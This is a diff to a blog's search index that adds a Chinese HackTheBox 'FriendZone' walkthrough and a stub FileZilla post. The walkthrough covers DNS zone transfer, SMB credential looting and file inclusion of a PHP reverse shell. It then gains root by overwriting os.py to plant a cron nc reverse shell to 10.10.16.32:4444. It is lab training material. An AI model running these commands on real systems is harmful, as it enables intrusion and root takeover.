@@ -4,6 +4,44 @@
   
     
     <entry>
+      <title>friendzone(hackthebbox)</title>
+      <link href="posts/3bc9f39e.html"/>
+      <url>posts/3bc9f39e.html</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ddd</p><h2 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h2><pre class="line-numbers language-none"><code class="language-none">namp -sC -sV 10.10.10.123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/11/13/IswvKe.png"></p><p>我们发现有ftp，但是不能匿名登录，DNS证书显示friendzone.red作为公共名称</p><p>访问10.10.10.123没有发现什么有效信息，访问443端口发现存在相应的域名访问，接下来利用dig搜索域名地址</p><pre class="line-numbers language-none"><code class="language-none">dig axfr friendzone.red @10.10.10.123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">域名信息administrator1.friendzone.red. 604800 IN A      127.0.0.1hr.friendzone.red.      604800  IN      A       127.0.0.1uploads.friendzone.red. 604800  IN      A       127.0.0.1friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改hosts文件将域名指向10.10.10.123才能正常访问127.0.0.1</p><p>windows下：C:\Windows\System32\drivers\etc\hosts    最好用notepad++打开用记事本比较麻烦</p><p>linux下：vim /etc/hosts</p><p>再次访问</p><p><a href="https://administrator1.friendzone.red/">https://administrator1.friendzone.red</a></p><p><img src="https://z3.ax1x.com/2021/11/13/Iss9OS.png"></p><p><a href="https://uploads.friendzone.red/">https://uploads.friendzone.red</a></p><p><img src="https://z3.ax1x.com/2021/11/13/IsyPc6.png"></p><p>存在上传点</p><p>上传一个123.txt试试</p><p><img src="https://z3.ax1x.com/2021/11/13/IsyWgx.png"></p><p>上传成功，但是找不到上传路径 </p><p>扫描smb共享共享文件信息</p><pre class="line-numbers language-none"><code class="language-none">enum4linux 10.10.10.123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/11/13/Isch7D.png"></p><p>发现存在print$、Files、general、Development、IPC$，但是只有general和Development可以登录</p><p>登录general</p><p><img src="https://z3.ax1x.com/2021/11/13/Is2oQI.png"></p><p>并且creds.txt可以下载下来</p><pre class="line-numbers language-none"><code class="language-none">$ cat creds.txtcreds for the admin THING:admin:WORKWORKHhallelujah@#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以用于之前的登录页面</p><p><img src="https://z3.ax1x.com/2021/11/13/IsWeUS.png"></p><p>登录成功，提示visit /dashboard.php</p><p><img src="https://z3.ax1x.com/2021/11/13/Is72jg.png"></p><p>提示图形名称参数丢失</p><p>后面给出默认参数image_id=a.jpg&amp;pagename=timestamp，我们输出查看</p><p><img src="https://z3.ax1x.com/2021/11/13/IsH5se.png"></p><p>返回了一个timestamp时间戳</p><p>登录Development</p><p><img src="https://z3.ax1x.com/2021/11/13/IsRDAS.png"></p><p>能上传文件</p><p>前面smb共享信息搜集发信file文件在夹是路径/etc/Files，下面的Development用过也是/etc/Development，可以上传shell</p><p>下载phpshell</p><pre class="line-numbers language-none"><code class="language-none">wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php代理下载 proxychains4 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>要修改ip和port变量，ip改为openvpn的ip，ifconfig tun0 查看</p><p>上传成功</p><p><img src="https://z3.ax1x.com/2021/11/13/Is4yV0.png"></p><p>扫一下<a href="https://administrator1.friendzone.red/%E8%B7%AF%E5%BE%84">https://administrator1.friendzone.red/路径</a></p><pre class="line-numbers language-none"><code class="language-none">gobuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u https://administrator1.friendzone.red -k -t 50<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">扫出的路径/images/login.php/dashboard.php/timestamp.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试timestamp.php</p><p><img src="https://z3.ax1x.com/2021/11/13/Is7epT.png"></p><p>返回的是timestamp时间戳</p><p>这与前面返回的timestamp一样，可能存在文件包含</p><p>尝试将pagename值改为上传的shell路径/etc/Development/php-reverse-shell.php，终端打开监听</p><p>访问（主机虚拟机访问都行）</p><pre class="line-numbers language-none"><code class="language-none">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/php-reverse-shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>监听成功</p><p><img src="https://z3.ax1x.com/2021/11/13/IsL8qe.png"></p><p>开启交互式</p><pre class="line-numbers language-none"><code class="language-none">python -c "import pty; pty.spawn('/bin/bash')"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传检测工具pspy64s、enumLinux.sh，通过Development上传，然后拷贝到/tmp目录下(一般执行文件房放在/tmp下没有那么多限制)</p><p><img src="https://z3.ax1x.com/2021/11/13/IsX2vV.png"></p><p>运行pspy64s</p><pre class="line-numbers language-none"><code class="language-none">./pspy64s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/11/13/IsjC8I.png"></p><p>发现存在python程序，uid=0为root权限</p><p>查看内容</p><pre class="line-numbers language-none"><code class="language-none">cat /opt/server_admin/reporter.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/11/13/IsvZy6.png"></p><p>调用了os</p><p>可以通过覆盖os.py得到root权限</p><p>os.py路径，存在</p><p><img src="https://z3.ax1x.com/2021/11/13/IsvR7F.png"></p><p>新建一个os.py反弹shell</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shell <span class="token operator">=</span> <span class="token triple-quoted-string string">'''* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.32 4444 &gt;/tmp/f'''</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/etc/crontab'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>覆盖原有os.py</p><pre class="line-numbers language-none"><code class="language-none">cp /etc/Development/os.py /usr/lib/python2.7/os.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看是否成功写入</p><pre class="line-numbers language-none"><code class="language-none">cat /etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/11/13/Isz2i4.png"></p><p>开启监听</p><pre class="line-numbers language-none"><code class="language-none">nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>待脚本运行后即可返回root权限shell    </p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>filezilla搭建FTP服务器</title>
+      <link href="posts/3a5e82e1.html"/>
+      <url>posts/3a5e82e1.html</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ddd</p><p>下载地址：<a href="https://www.filezilla.cn/download">下载 - FileZilla中文网</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> ftp服务器搭建 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Windows日志分析</title>
       <link href="posts/604d6f82.html"/>
       <url>posts/604d6f82.html</url>
